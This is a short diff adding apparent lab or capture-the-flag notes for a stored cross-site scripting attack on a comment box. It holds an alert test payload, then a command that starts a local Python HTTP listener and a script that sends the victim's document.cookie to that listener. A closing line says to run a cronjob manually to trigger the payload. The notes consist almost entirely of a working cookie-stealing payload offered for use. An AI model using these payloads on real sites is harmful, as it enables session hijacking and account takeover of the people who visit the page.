@@ -1,0 +1,16 @@
+Part1 Put this in comment box
+<script>
+alert("hi");
+</script> 
+
+Part2
+python3 -m http.server 8000
+
+<script>
+var xhr=new XMLHttpRequest(); 
+xhr.open("GET", "http://0.0.0.0:8000/?"+document.cookie, true); 
+xhr.send();
+</script> 
+
+Run Cronjob Manually after that their script is not working
+
